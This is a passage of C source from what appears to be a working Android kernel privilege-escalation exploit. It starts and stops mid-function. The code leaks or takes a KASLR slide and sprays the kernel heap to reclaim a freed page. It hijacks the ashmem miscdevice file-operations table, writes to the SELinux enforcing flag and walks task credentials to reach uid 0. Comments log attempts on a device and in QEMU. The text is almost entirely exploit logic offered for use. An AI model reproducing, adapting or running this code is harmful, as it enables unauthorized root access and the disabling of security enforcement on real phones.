    {
      int misc_minor = -1;
      uint64_t kcode_start = 0;
      FILE *mf = fopen("/proc/misc", "r");
      if (mf) {
        char line[256];
        while (fgets(line, sizeof(line), mf)) {
          int minor = 0;
          char name[64] = {0};
          if (sscanf(line, "%d %63s", &minor, name) == 2 &&
              !strcmp(name, "ashmem")) {
            misc_minor = minor;
            break;
          }
        }
        fclose(mf);
      }
      mf = fopen("/proc/iomem", "r");
      if (mf) {
        char line[256];
        while (fgets(line, sizeof(line), mf)) {
          uint64_t s = 0, e = 0;
          char name[64] = {0};
          if (sscanf(line, "%llx-%llx : %63[^\n]", (unsigned long long *)&s,
                     (unsigned long long *)&e, name) == 3 ||
              sscanf(line, "%llx-%llx: %63[^\n]", (unsigned long long *)&s,
                     (unsigned long long *)&e, name) == 3) {
            if (!strcmp(name, "Kernel code")) {
              kcode_start = s;
              break;
            }
          }
        }
        fclose(mf);
      }
      pr_info("QEMU_INIT misc ashmem minor=%d kcode=%016llx\n", misc_minor,
              (unsigned long long)kcode_start);
      if (misc_minor >= 0) {
        mkdir("/dev", 0755);
        unlink("/dev/ashmem");
        long mr = mknod("/dev/ashmem", S_IFCHR | 0600,
                        makedev(10, misc_minor));
        pr_info("QEMU_INIT mknod /dev/ashmem c10 %d : ret=%ld errno=%d\n",
                misc_minor, mr, errno);
      }
      if (kcode_start) {
        char kb[32];
        snprintf(kb, sizeof(kb), "0x%llx",
                 (unsigned long long)(kcode_start - 0x10000));
        setenv("KPHYS", kb, 1);
        pr_info("QEMU_INIT KPHYS=%s (kcode-0x10000)\n", kb);
      }
    }
  }

  {
    /* Pick the highest core in our CURRENT cpuset (Android demotes
     * long-running background procs to 0-3 mid-run; requesting a
     * demoted-out core gives EINVAL). Parse Cpus_allowed_list. */
    unsigned long hi = CORE;
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
      char l[256];
      while (fgets(l, sizeof(l), f)) {
        if (strncmp(l, "Cpus_allowed_list:", 18) == 0) {
          char *p = l + 18;
          unsigned long a, b;
          while (*p) {
            while (*p == ' ' || *p == '	') p++;
            if (!*p) break;
            a = strtoul(p, &p, 10);
            b = a;
            if (*p == '-') b = strtoul(p + 1, &p, 10);
            if (b > hi) hi = b;
            while (*p && *p != ' ' && *p != ',') p++;
          }
          break;
        }
      }
      fclose(f);
    }
    char *cs = getenv("CORE_SEL");
    g_core_sel = (cs && cs[0]) ? strtoul(cs, NULL, 0) : hi;
    if (g_core_sel > hi) {
      pr_info("CORE_SEL %lu above allowed max %lu — clamping\n", g_core_sel, hi);
      g_core_sel = hi;
    }
    pr_info("pin core = %lu (CORE_SEL)\n", g_core_sel);
  }
  /* QUIESCE_MAX: wait (bounded) for 1-min loadavg to drop below this
   * before the reclaim choreography — background mm-cache churn on our
   * core buries the freed page. Default 0 = no gate. */
  {
    double qmax = 0;
    char *qs = getenv("QUIESCE_MAX");
    if (qs && qs[0])
      qmax = strtod(qs, NULL);
    if (qmax > 0) {
      for (int w = 0; w < 60; w++) {
        double lavg = 99;
        FILE *f = fopen("/proc/loadavg", "r");
        if (f) {
          fscanf(f, "%lf", &lavg);
          fclose(f);
        }
        if (lavg <= qmax) {
          pr_info("QUIESCE ok loadavg=%.2f\n", lavg);
          break;
        }
        usleep(500000);
      }
    }
  }

  if (!active_offsets && select_offsets() < 0) return 1;

  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(g_core_sel);

  /*
   * KASLR: G06 uses perf text-base; CPH shell gets EACCES on perf_event_open
   * despite paranoid=-1. Default skip; USE_PERF_TEXT=1 to try.
   */
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  {
    /* KASLR_SLIDE env: slide harvested from a live UMASK fire
     * (dmesg/kallsyms). All text values (fops JT pointers, traps)
     * become runtime-correct via kaslr_image_addr(). */
    const char *sv = getenv("KASLR_SLIDE");
    if (sv && sv[0]) {
      uint64_t sv64 = strtoull(sv, NULL, 0);
      if (sv64) {
        kaslr_base = (uint64_t)KIMAGE_TEXT_BASE + sv64;
        kaslr_slide = sv64;
        kaslr_done = 1;
        pr_success("kaslr_slide env=%016llx base=%016llx\n",
                   (unsigned long long)sv64,
                   (unsigned long long)kaslr_base);
      }
    }
  }
  if (env_flag("USE_PERF_TEXT", 0) && !env_flag("SKIP_PERF_TEXT", 0)) {
    int ns = 0;
    uint64_t min_kip = 0;
    uint64_t tb = perf_leak_text_base(&ns, &min_kip);
    if (tb) {
      kaslr_base = tb;
      kaslr_slide = kaslr_base - (uint64_t)KIMAGE_TEXT_BASE;
      kaslr_done = 1;
      pr_success("perf text-base-ok pid=%d samples=%d min_kip=%016llx "
                 "text=%016llx slide=%016llx (perf)\n",
                 getpid(), ns, (unsigned long long)min_kip,
                 (unsigned long long)kaslr_base,
                 (unsigned long long)kaslr_slide);
    } else {
      pr_info("perf text-base failed; fallback link KIMAGE=%016llx\n",
              (unsigned long long)KIMAGE_TEXT_BASE);
      kaslr_base = KIMAGE_TEXT_BASE;
      kaslr_slide = 0;
      kaslr_done = 1;
    }
  } else {
    pr_info("kaslr_base=KIMAGE=%016llx (perf skipped; USE_PERF_TEXT=1 to try)\n",
            (unsigned long long)KIMAGE_TEXT_BASE);
  }
  if (env_flag("PERF_TEXT_ONLY", 0)) {
    pr_info("PERF_TEXT_ONLY=1: stop after text-base probe "
            "base=%016llx slide=%016llx done=%d\n",
            (unsigned long long)kaslr_base,
            (unsigned long long)kaslr_slide, kaslr_done);
    return kaslr_base ? 0 : 1;
  }

  /*
   * CFI_TEST=1: QEMU manual-swap validation of the post-fops-swap chain.
   * Sprays the fake page (fops table + configfs R/W blob layout), prints
   * every address lldb needs, then blocks until /tmp/go appears (created
   * by the runner while lldb writes ashmem_misc.fops = fake_fops), then
   * runs try_cfi_stage: fresh O_RDWR open → SET_NAME blob → pwrite →
   * pread readback. Validates table slots, CFG_* offsets, text pointers
   * and kCFI cleanliness of the configfs write_iter path — without the
   * UAF walk (which TCG cannot prime).
   */
  if (env_flag("CFI_TEST", 0)) {
    uint64_t misc_off = active_offsets ? active_offsets->off_ashmem_misc_fops
                                       : ASHMEM_MISC_FOPS_OFF;
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base) {
      pr_error("CFI_TEST: spray failed\n");
      return 1;
    }
    pr_success("CFI_TEST armed page=%016zx fake_fops=%016zx "
               "misc_text_va=%016llx misc_p0=%016zx binwrite_target=%016zx\n",
               page_base, fake_fops,
               (unsigned long long)(kaslr_base + misc_off),
               data_addr(KIMAGE_TEXT_BASE + misc_off),
               binwrite_target);
    /*
     * KPAGEFLAGS oracle (QEMU root): is base's page still SLUB-held
     * (KPF_SLAB bit7=0x80) or free in the buddy (KPF_BUDDY bit10=0x400)?
     * phys = low-bits of the P0 alias + P0_PHYS_OFFSET (see p0_data_alias).
     */
    {
      /* linear→phys needs the RUNNING RAM base, not the device P0 const:
       * parse the first "System RAM" start from /proc/iomem. */
      uint64_t memstart = 0;
      {
        FILE *f = fopen("/proc/iomem", "r");
        if (f) {
          char line[256];
          while (fgets(line, sizeof(line), f)) {
            uint64_t s = 0, e = 0;
            char name[64] = {0};
            int nr = sscanf(line, "%llx-%llx : %63[a-zA-Z ]",
                            (unsigned long long *)&s,
                            (unsigned long long *)&e, name);
            if (nr < 2) {
              s = 0;
              nr = sscanf(line, "%llx-%llx: %63[a-zA-Z ]",
                          (unsigned long long *)&s,
                          (unsigned long long *)&e, name);
            }
            if (nr == 3 && strstr(name, "System RAM")) {
              memstart = s;
              break;
            }
          }
          fclose(f);
        }
      }
      uint64_t bphys = (page_base & 0x0000007fffffffffULL) + memstart;
      uint64_t bpfn = bphys >> 12;
      int kf = open("/proc/kpageflags", O_RDONLY);
      int kc = open("/proc/kpagecount", O_RDONLY);
      uint64_t fl = 0, cnt = 0;
      if (kf >= 0 &&
          pread(kf, &fl, sizeof(fl), (off_t)(bpfn * 8)) == (ssize_t)sizeof(fl))
        ;
      if (kc >= 0 &&
          pread(kc, &cnt, sizeof(cnt), (off_t)(bpfn * 8)) == (ssize_t)sizeof(cnt))
        ;
      if (kf >= 0) close(kf);
      if (kc >= 0) close(kc);
      pr_info("KPAGE base phys=%016llx pfn=%llx flags=%016llx count=%llu "
              "SLAB=%d BUDDY=%d ANON=%d\n",
              (unsigned long long)bphys, (unsigned long long)bpfn,
              (unsigned long long)fl, (unsigned long long)cnt,
              (int)!!(fl & 0x80), (int)!!(fl & 0x400), (int)!!(fl & 0x400000));
      /* per-claim probe: one order-2 ring at a time; watch base's flags */
      {
        int kf3 = open("/proc/kpageflags", O_RDONLY);
        for (int i = 0; i < 8 && kf3 >= 0; i++) {
          iouring_ring_reclaim_one(NULL, 0, 0);
          usleep(30000);
          uint64_t f3 = 0;
          pread(kf3, &f3, sizeof(f3), (off_t)(bpfn * 8));
          pr_info("CLAIMPROBE ring#%d -> base flags=%016llx BUDDY=%d\n",
                  i + 1, (unsigned long long)f3, (int)!!(f3 & 0x400));
          if (!(f3 & 0x400))
            break; /* claimed! */
        }
        if (kf3 >= 0)
          close(kf3);
      }
      /* neighborhood sweep: F=buddy-free S=slab .=other, base marked <> */
      {
        int kf2 = open("/proc/kpageflags", O_RDONLY);
        if (kf2 >= 0) {
          char map[64];
          int mi = 0;
          for (int d = -8; d <= 8; d++) {
            uint64_t f2 = 0;
            if (d == 0) {
              map[mi++] = '<';
            }
            if (pread(kf2, &f2, sizeof(f2),
                      (off_t)((bpfn + d) * 8)) == (ssize_t)sizeof(f2)) {
              map[mi++] = (f2 & 0x400) ? 'F' : ((f2 & 0x80) ? 'S' : '.');
            } else {
              map[mi++] = '?';
            }
            if (d == 0) {
              map[mi++] = '>';
            }
          }
          map[mi] = 0;
          pr_info("KPAGE sweep [-8..+8]: %s (F=free S=slab .=alloc)\n", map);
          close(kf2);
        }
      }
    }
    int armed_s = env_flag("CFI_TEST_WAIT", 45);
    pr_info("CFI_TEST: %ds window for external MISC.fops poke (lldb)…\n",
            armed_s);
    for (int i = 0; i < armed_s * 2; i++) {
      if (access("/tmp/go", F_OK) == 0) break;
      usleep(500000);
    }
    pr_info("CFI_TEST barrier %s — running try_cfi_stage\n",
            access("/tmp/go", F_OK) == 0 ? "released" : "window closed");
    int cfi_ok = try_cfi_stage();
    pr_info("CFI_TEST done ok=%d step=%d errno=%d wr=%zd rd=%zd\n",
            cfi_ok, cfi_last_step, cfi_last_errno, cfi_write_ret,
            cfi_read_ret);
    return cfi_ok ? 0 : 1;
  }

  timer_reset();
  TIMER("exploit start");

  write_root_script();

  /*
   * DATA-ONLY write (before all phase gating so it runs in any
   * environment): stack-stamp rb_erase writes 0 to DATAONLY_TARGET
   * (image offset env, default selinux_enforcing) through a static
   * .data lock. No heap, no spray, no fops, no CFI.
   */
  if (env_flag("MODE4_DATAONLY", 0)) {
    unsigned long toff = env_ulong("DATAONLY_TARGET", 0x2a793c8);
    uintptr_t dtgt = data_addr(KIMAGE_TEXT_BASE + toff);
    pr_info("DATAONLY target=%016zx\n", dtgt);
    do_one_write(dtgt, "data-only write", 4);
    pr_info("DATAONLY done\n");
    return 0;
  }

  /* Phase 1: Disable SELinux (+ optional fops redirect for UMH path) */
  int selinux_ok = check_selinux_off();
  int umh_available = active_offsets &&
      active_offsets->off_system_unbound_wq &&
      active_offsets->off_ashmem_misc_fops;

  /* FORCE_WRITE1=1: skip UMH mode=4 and go straight to SELinux write1. */
  int force_w1 = env_flag("FORCE_WRITE1", 0);
  /*
   * MODE4_WRITE_PROOF / MODE4_ARISTOTLE: prove rb_erase store without fops swap.
   * Default target = sysctl_bootid (P0). Compare /proc boot_id before/after.
   * WRITE_PROOF_TARGET=enforce|fops|bootid (default bootid).
   * Always MODE4_ONLY (never W1). Auto-enables aristotle only-left stamp in fops.
   */
  int write_proof = env_flag("MODE4_WRITE_PROOF", 0) ||
                    env_flag("MODE4_ARISTOTLE", 0) ||
                    env_flag("MODE4_SLIDE", 0) ||
                    env_flag("MODE4_SLIDE_ZERO", 0) ||
                    env_flag("MODE4_SLIDE_VERIFY", 0) ||
                    env_flag("MODE4_SLIDE_SWAP", 0) ||
                    env_flag("MODE4_ROOT", 0);
  if (env_flag("MODE4_SLIDE", 0) || env_flag("MODE4_SLIDE_ZERO", 0) ||
      env_flag("MODE4_SLIDE_VERIFY", 0) ||
      env_flag("MODE4_SLIDE_SWAP", 0) ||
      env_flag("MODE4_ROOT", 0)) {
    if (env_flag("MODE4_ROOT", 0)) setenv("MODE4_SLIDE", "1", 1);
    setenv("MODE4_WRITE_PROOF", "1", 0); /* stamp chain gate */
  }
  if (write_proof && umh_available && !force_w1) {
    char boot_before[80];
    char boot_after[80];
    int spray_verify_ret = -2;
    char enf_before[8];
    char enf_after[8];
    read_first_line("/proc/sys/kernel/random/boot_id", boot_before,
                    sizeof(boot_before));
    read_first_line("/sys/fs/selinux/enforce", enf_before, sizeof(enf_before));
    memcpy(g_bootid_before, boot_before, sizeof(g_bootid_before));

    const char *tgt_name = getenv("WRITE_PROOF_TARGET");
    if (env_flag("MODE4_SLIDE_ZERO", 0)) {
      tgt_name = "dataonly";
    } else if (env_flag("MODE4_SLIDE_SWAP", 0)) {
      tgt_name = "bootid"; /* target unused by stamp (stamp overrides) */
    } else if (!tgt_name || !tgt_name[0])
      tgt_name = "bootid";
    uintptr_t proof_tgt;
    uintptr_t proof_val;
    const char *desc;
    /*
     * only-left stores parent_color into *target. parent is always fake_fops
     * (spray). proof_val is unused for geometry (kept 0 → prepare may set
     * pselect_custom_value=fake_fops for bookkeeping).
     */
    if (!strcmp(tgt_name, "dataonly")) {
      const char *p0t = getenv("SLIDE_P0_TARGET");
      if (p0t && p0t[0]) {
        proof_tgt = (uintptr_t)strtoull(p0t, NULL, 0);
        proof_val = 0;
        desc = "SLIDE_ZERO P0 target";
      } else {
        unsigned long doff = env_ulong("DATAONLY_TARGET", 0x2a793c8);
        proof_tgt = data_addr(KIMAGE_TEXT_BASE + doff);
        proof_val = 0;
        desc = "SLIDE_ZERO data-only";
      }
    } else if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux")) {
      proof_tgt = data_addr(SELINUX_ENFORCING);
      proof_val = 0;
      desc = "WRITE_PROOF enforce (only-left *enf=fake_fops; may not be 0)";
    } else if (!strcmp(tgt_name, "fops") || !strcmp(tgt_name, "misc")) {
      proof_tgt = data_addr(ASHMEM_MISC_FOPS);
      proof_val = 0;
      desc = "WRITE_PROOF fops (only-left *MISC=fake_fops)";
    } else if (!strcmp(tgt_name, "spray")) {
      proof_tgt = 0; /* late-bound in fops.c/util.c stamps (MODE4_WPROOF_SPRAY) */
      proof_val = 0;
      desc = "WRITE_PROOF spray marker (*(fake_fops+0x90)=fake_fops+0x80)";
    } else {
      /* Prefer p0-profile sysctl_bootid if same as SLIDE; else slide_boot_id */
      uint64_t boot_off =
          (active_offsets && active_offsets->off_slide_boot_id)
              ? active_offsets->off_slide_boot_id
              : SLIDE_SYSCTL_BOOTID_OFF;
      proof_tgt = data_addr(KIMAGE_TEXT_BASE + boot_off);
      proof_val = 0;
      desc = "WRITE_PROOF bootid (only-left *bootid=fake_fops)";
    }

    pr_success("WRITE_PROOF start %s target=%s addr=%016zx val=%016zx "
               "boot_before=%s enforce_before=%s\n",
               desc, tgt_name, proof_tgt, proof_val, boot_before, enf_before);
    durable_stage("write_proof_enter");
    slab_drain();
    TIMER("pre-WRITE_PROOF drain");
    /* mode=4 so fops packing + MODE4_ARISTOTLE stamp apply */
    set_pselect_write_mode(proof_tgt, proof_val, 4);
    if (!proof_val && (!strcmp(tgt_name, "fops") || !strcmp(tgt_name, "misc"))) {
      /* value filled in prepare_skb_payload as fake_fops when 0 */
    }
    pselect_child_node = 1;
    TIMER("  heap spray start");
    durable_stage("spray_start");
    if (env_flag("UID0_DIRECT", 0)) {
      /* P2 spray-free: uid0_w2_overlay already pinned lock/task to BSS —
       * skip the KernelSnitch spray entirely (it starves on the churned
       * post-P1 boot; chains F/G/H died here). */
      pr_info("UID0_DIRECT: spray skipped (BSS overlay lock=%016zx)\n",
              fake_lock);
    } else if (((env_flag("MODE4_SLIDE_ZERO", 0) &&
          !env_flag("MODE4_SLIDE_CRED", 0)) ||
         (env_flag("MODE4_SLIDE", 0) && !env_flag("MODE4_SLIDE_SWAP", 0))) &&
        !env_flag("MODE4_SLIDE_CRED", 0) &&
        !env_flag("MODE4_SLIDE_SPRAY", 0)) {
      /* Z9–Z13 / O26–O28 died at pselect overlay of sprayed lock/task.
       * Park and spray-free SLIDE oracle are stack-only; pin lock/task
       * to init_task BSS. SLIDE_SWAP still sprays (needs fake_fops page).
       * MODE4_SLIDE_SPRAY=1: 2026-08-29 — the spray-free redirect kills
       * the boot/adb within ~30s (2/2 fires), leaving no window for the
       * swap fire. The sprayed oracle redirect survived minutes on
       * 2026-08-23 — that is the survivable variant for two-fire. */
      uint64_t it_off = (active_offsets && active_offsets->off_init_task)
                            ? active_offsets->off_init_task
                            : 0x027CC000ULL;
      uintptr_t bss_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
      page_base = bss_lock;
      fake_lock = bss_lock;
      fake_fops = bss_lock;
      fake_task = data_addr(KIMAGE_TEXT_BASE + it_off);
      pr_info("SLIDE/ZERO spray skipped: lock=init_task+0x878 %016zx "
              "task=init_task_p0 %016zx\n",
              fake_lock, fake_task);
    } else if (env_flag("MODE4_STATIC_CHAIN", 0) &&
        !env_flag("MODE4_SC_SPRAY", 0)) {
      /* Spray-free chain: table lives in the kernel image tail;
       * dummies satisfy do_pselect_fake_lock_route guards. */
      uint64_t tail = data_addr(KIMAGE_TEXT_BASE +
                                (active_offsets
                                     ? active_offsets->off_bss_tail_lock
                                     : 0));
      page_base = tail;
      fake_lock = tail + 0x400;
      fake_fops = tail;
      binwrite_target = tail + 0x200;
      pr_info("STATIC_CHAIN: spray skipped, tail=%016zx\n", tail);
    } else {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base) {
      pr_error("WRITE_PROOF heap spray failed\n");
      clear_pselect_write();
      return 1;
    }
    }
    /* If fops path left value 0, payload set pselect_custom_value=fake_fops;
     * re-stamp stack uses that via pselect_custom_value in prepare_pselect. */
    if ((!proof_val) && pselect_custom_value)
      proof_val = pselect_custom_value;
    TIMER("  heap spray done");
    durable_stage("spray_done_before_route_threads");
    { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
    if(tf>=0){write(tf,"MAIN_BEFORE_THREADS'+BS+'n",19);close(tf);} }
  run_main_route_threads();
    durable_stage("route_threads_returned");
  { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
    if(tf>=0){write(tf,"MAIN_AFTER_THREADS'+BS+'n",18);close(tf);} }
    TIMER("  PI route done");
    clear_pselect_write();
    if (!strcmp(tgt_name, "spray")) {
      int v = wproof_spray_verify((uint64_t)fake_fops + 0x80);
      durable_stage(v == 1 ? "spray_placement_VERIFIED"
                           : (v == 0 ? "spray_placement_MISMATCH"
                                     : "spray_placement_NOTABLE"));
      pr_success("WRITE_PROOF spray verify ret=%d (1=verified, 0=mismatch, "
                 "-1=no table)\n", v);
      spray_verify_ret = v;
    }

    read_first_line("/proc/sys/kernel/random/boot_id", boot_after,
                    sizeof(boot_after));
    read_first_line("/sys/fs/selinux/enforce", enf_after, sizeof(enf_after));
    int boot_wrote = strcmp(boot_before, boot_after) != 0;
    int enf_wrote = (enf_before[0] != enf_after[0]);
    int landed = 0;
    if (env_flag("MODE4_NULL_STORE", 0))
      landed = atomic_load(&consumer_success) >= 1;
    else if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux") ||
        !strcmp(tgt_name, "dataonly"))
      landed = enf_wrote || (enf_after[0] == '0');
    else if (!strcmp(tgt_name, "fops") || !strcmp(tgt_name, "misc"))
      landed = (cfi_last_step == 0 && cfi_dirty_seen) || (cfi_write_ret > 0);
    else if (!strcmp(tgt_name, "spray"))
      landed = (spray_verify_ret == 1);
    else
      landed = boot_wrote;

    if (env_flag("QEMU_INIT", 0)) {
      char hn[80] = {0};
      read_first_line("/proc/sys/kernel/hostname", hn, sizeof(hn));
      pr_success("QEMU_HOSTNAME=[%.60s]\n", hn);
      read_first_line("/proc/sys/kernel/random/boot_id", boot_after,
                      sizeof(boot_after));
      pr_success("QEMU_BOOTID=[%.40s]\n", boot_after);
    }
    {
      char hn[80] = {0};
      read_first_line("/proc/sys/kernel/hostname", hn, sizeof(hn));
      pr_success("WP_HOSTNAME=[%.60s]\n", hn);
      live_sync_log("WP", hn);
      char btag[128];
      snprintf(btag, sizeof(btag), "WP_BOOTAFTER=[%.40s]", boot_after);
      live_sync_log("WP", btag);
    }
    pr_success("WRITE_PROOF done landed=%d boot_wrote=%d enf_wrote=%d "
               "boot_after=%s enforce_after=%s success_calls "
               "cfi_step=%d cfi_errno=%d cfi_wr=%zd\n",
               landed, boot_wrote, enf_wrote, boot_after, enf_after,
               cfi_last_step, cfi_last_errno, cfi_write_ret);
    durable_stage(landed ? "write_proof_LANDED" : "write_proof_miss");
    pr_info("WRITE_PROOF %s — stopping (no W1). MODE4_ONLY implied.\n",
            landed ? "POSITIVE store executes on-device"
                   : "NEGATIVE (walk miss / wrong alias / no write)");
    /*
     * Same-process park→cred. Z5 second process on a park boot KP'd at
     * requeue. fire_mode sets MODE4_ONLY so this must run here, before
     * the write_proof return.
     */
    if (env_flag("MODE4_UID0", 0) || env_flag("UID0_DIRECT", 0)) {
      if (env_flag("UID0_DIRECT", 0)) {
        /* Two-process mode: no W1 here (process 1 unhooked the guard).
         * The DEFAULT target route below (proof_tgt=bootid) primes the
         * fdset stamp; uid0_cred_walk replaces it with the cred stamp
         * BEFORE its route runs — this process's FIRST walk stores. */
        pr_info("UID0_DIRECT: W1 done by proc1 — direct cred punch\n");
        live_sync_log("UID0", "direct_entry");
        return uid0_cred_walk();
      }
      if (env_flag("MODE4_NULL_STORE", 0)) {
        int walk_ok = atomic_load(&consumer_success) >= 1;
        pr_info("UID0 hook-off walk success=%d landed=%d enforce=%s\n",
                walk_ok, landed, enf_after);
        if (!walk_ok) {
          pr_info("UID0: leaf-NULL miss — not walking cred\n");
          live_sync_log("UID0", "hookoff_miss");
          return 1;
        }
        live_sync_log("UID0", "hookoff_ok");
        return uid0_cred_walk();
      }
      int park_ok = enf_wrote || check_selinux_off() || (enf_after[0] == '0');
      if (!park_ok) {
        pr_info("UID0: park miss (enforce still on) — not walking cred\n");
        live_sync_log("UID0", "park_miss");
        return 1;
      }
      return uid0_cred_walk();
    }
    /*
     * After SLIDE_SWAP: keep spray live. Do NOT second-walk in-process
     * (N14 repair walk KP'd at pre-select). Host fires a fresh process
     * MODE4_SLIDE_ZERO SLIDE_P0_TARGET=fake_fops+8 to NULL llseek.
     */
    if (env_flag("MODE4_SLIDE_SWAP", 0) && fake_fops) {
      int swap_ok = atomic_load(&consumer_success) >= 1;
      pr_info("SWAP post: fake_fops=%016zx llseek_slot=%016zx success=%d\n",
              fake_fops, fake_fops + 8, swap_ok);
      live_sync_log("STAGE", swap_ok ? "swap_ok" : "swap_miss");
      if (swap_ok) {
        /* pselect overlay is gone (threads joined). Open here, not from
         * the waiter and not from a second process (N11/N13). */
        pr_info("TRYCFI main after pselect fake_fops=%016zx\n", fake_fops);
        durable_stage("trycfi_main");
        fflush(stdout);
        fsync(STDOUT_FILENO);
        int cfi_ok = try_cfi_stage();
        pr_info("TRYCFI main cfi_ok=%d step=%d errno=%d wr=%zd\n", cfi_ok,
                cfi_last_step, cfi_last_errno, cfi_write_ret);
        durable_stage(cfi_ok ? "configfs_LIVE" : "configfs_fail");
        live_sync_log("STAGE", cfi_ok ? "kwrite_live" : "kwrite_fail");
        pr_info("HOLD after swap fake_fops=%016zx pid=%d cfi_ok=%d\n",
                fake_fops, getpid(), cfi_ok);
        live_sync_log("STAGE", "swap_hold");
        durable_stage("swap_hold_main");
        fflush(stdout);
        fsync(STDOUT_FILENO);
        for (;;)
          sleep(30);
      }
    }
    if (env_flag("MODE4_ROOT", 0) && boot_after[0]) {
      uint64_t rslide = slide_decode_from_bootid(boot_after);
      pr_info("ROOT ph2: slide=%016llx bootid=%s\n",
              (unsigned long long)rslide, boot_after);
      if (rslide) {
        kaslr_slide = rslide;
        kaslr_base = (uint64_t)KIMAGE_TEXT_BASE + rslide;
        kaslr_done = 1;
        pr_success("ROOT: slide=%016llx\n", (unsigned long long)rslide);
        unsetenv("MODE4_SLIDE");
        unsetenv("MODE4_SLIDE_ZERO");
        unsetenv("MODE4_SLIDE_VERIFY");
        setenv("MODE4_SLIDE_SWAP", "1", 1);
        usleep(200000);
        /*
         * Phase-2 drain: default LIGHT — the phase-1 fork storm already
         * ran at lower uptime; a second storm at uptime+4min matches the
         * R1 death pattern. do_one_write's own spray carries fresh clone
         * storms + reclaim cycles. ROOT_PH2_DRAIN=1 restores full drain.
         */
        if (env_flag("ROOT_PH2_DRAIN", 0)) slab_drain();
        /*
         * Heap geometry must replicate SS1/SV1 exactly: parent=P0(boot_id
         * uuid buffer)-8 (harmless string scratch). The REAL write
         * (fake_fops -> P0(MISC.fops)) comes from the SLIDE_SWAP stack
         * stamp, which hardcodes its own tree_l. Passing MISC here would
         * point the heap pi erase at the live miscdevice.
         */
        uint64_t boot_off =
            (active_offsets && active_offsets->off_slide_boot_id)
                ? active_offsets->off_slide_boot_id
                : SLIDE_SYSCTL_BOOTID_OFF;
        do_one_write(data_addr(KIMAGE_TEXT_BASE + boot_off), "ROOT swap", 4);
        pr_info("ROOT swap done cfi=%d wr=%zd\n",
                cfi_last_step, cfi_write_ret);
        return 0;
      }
      pr_error("ROOT: slide decode failed\n");
    }
    return landed ? 0 : 1;
  }

  if (!selinux_ok && umh_available && !force_w1) {
    /* UMH path: mode=4 redirects miscdevice fops via W0's pi_tree.
     * miscdevice starts at ASHMEM_FOPS_PTR (repr(transparent) Registration).
     * fops at miscdevice+0x10 = ASHMEM_MISC_FOPS. */
    int chain = env_flag("MODE4_CHAIN", 0);
    int zion = env_flag("MODE4_ZION", 0);
    int zi = env_flag("MODE4_ZI", 0);
    int wion = env_flag("MODE4_WION", 0);
    int zio = env_flag("MODE4_ZIO", 0);
    int pad3 = env_flag("MODE4_PAD3", 0);
    pr_info("UMH path: fops redirect (mode=4)%s...\n",
            pad3 ? " MODE4_PAD3 pad→*MISC"
                 : (zio ? " MODE4_ZIO ZERO→OWNER→ION"
                        : (wion ? " MODE4_WION waitlock0→ION"
                                : (zi ? " MODE4_ZI ZERO→ION"
                                      : (zion ? " MODE4_ZION NAME0→ION"
                                              : (chain ? " MODE4_CHAIN ZERO→OWNER→ION"
                                                       : ""))))));
    live_sync_log("MAIN", pad3 ? "umh_pad3_start"
                               : (zio ? "umh_zio_start"
                                      : (wion ? "umh_wion_start"
                                              : (zi ? "umh_zi_start"
                                                    : (zion ? "umh_zion_start"
                                                            : (chain ? "umh_chain_start"
                                                                     : "umh_mode4_start"))))));
    {
      char b[96];
      read_first_line("/proc/sys/kernel/random/boot_id", b, sizeof(b));
      live_sync_log("BOOT_BEFORE", b);
    }
    /*
    slab_drain();
    TIMER("pre-UMH drain");
    /*
     * MODE4_RETRY: JC6 proved miss rolls can SURVIVE (errno22 = no swap,
     * clean exit). Each retry = a fresh placement lottery on the SAME
     * boot (new spray/leak/cycles/walk). Stop early on success
     * (cfi_write_ret>0), a hard failure (walk-crash softboots anyway),
     * or when SELinux already went permissive from a prior attempt.
     */
    {
      int retries = env_int_range("MODE4_RETRY", 1, 1, 10);
      for (int att = 1; att <= retries; att++) {
        cfi_write_ret = -1;
        cfi_last_step = -1;
        cfi_dirty_seen = 0;
        pr_info("MODE4_RETRY attempt %d/%d\n", att, retries);
        do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
        if (cfi_write_ret > 0 || check_selinux_off()) {
          pr_success("MODE4_RETRY attempt %d WIN (wr=%zd)\n", att,
                     cfi_write_ret);
          break;
        }
        if (att < retries) {
          pr_info("MODE4_RETRY miss (step=%d errno=%d) — re-rolling\n",
                  cfi_last_step, cfi_last_errno);
          usleep(200000);
        }
      }
    }
    TIMER("fops redirect done");
    {
      char b[96];
      read_first_line("/proc/sys/kernel/random/boot_id", b, sizeof(b));
      live_sync_log("BOOT_AFTER", b);
    }
    live_sync_log("MAIN", "umh_mode4_done");
    selinux_ok = check_selinux_off();
    /* CPH isolation: stop after mode4/chain (Write1 packing softboots). */
    if (env_flag("MODE4_ONLY", 0) || chain || zion || zi || wion || zio ||
        pad3) {
      if (env_flag("UID0_DIRECT", 0)) {
        /* direct punch: skip the generic mode4 stop — proceed to
         * write_proof's UID0 gate which routes to uid0_cred_walk */
        pr_info("UID0_DIRECT: bypassing MODE4_ONLY stop\n");
      } else {
      pr_info("MODE4_ONLY/.../ZIO stop after fops (cfi step=%d errno=%d wr=%zd "
              "fake_fops=%016zx)\n",
              cfi_last_step, cfi_last_errno, cfi_write_ret, fake_fops);
      live_sync_log("MAIN", "stop_no_w1");
      if (zi && fake_fops && env_flag("MODE4_SWAP_HOLD", 0)) {
        if (!env_flag("MODE4_SWAP_NOCFI", 0)) {
          pr_info("ZI TRYCFI main after ION fake_fops=%016zx\n", fake_fops);
          durable_stage("zi_trycfi_main");
          fflush(stdout);
          fsync(STDOUT_FILENO);
          int cfi_ok = try_cfi_stage();
          pr_info("ZI TRYCFI cfi_ok=%d step=%d errno=%d wr=%zd\n", cfi_ok,
                  cfi_last_step, cfi_last_errno, cfi_write_ret);
        }
        pr_info("ZI HOLD fake_fops=%016zx pid=%d — not exiting\n", fake_fops,
                getpid());
        durable_stage("zi_hold");
